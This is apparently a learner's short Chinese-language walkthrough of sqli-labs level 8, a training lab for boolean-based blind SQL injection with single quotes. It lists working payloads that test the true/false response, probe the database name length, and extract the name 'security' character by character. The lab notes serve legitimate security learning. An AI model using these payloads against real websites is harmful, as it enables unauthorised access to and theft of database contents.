title: sql-labs 8关

**Less-8** GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注/基于’的盲注（利用dns回显）)

布尔型盲注，单引号，id=1回显，价格单引号不回显，构造一下验证是不是布尔型payload ?id=1' and 1=1 --+ 回显了

![image-20220330095718100](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330095718100.png)

暴库payload

![image-20220330100154595](C:\Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220330100154595.png)

库名长度可使用?id=1' and length(database())=8--+ 判断，同理表名字，段名等。

最后得到库名?id=1' and left((select database()),8)='security'--+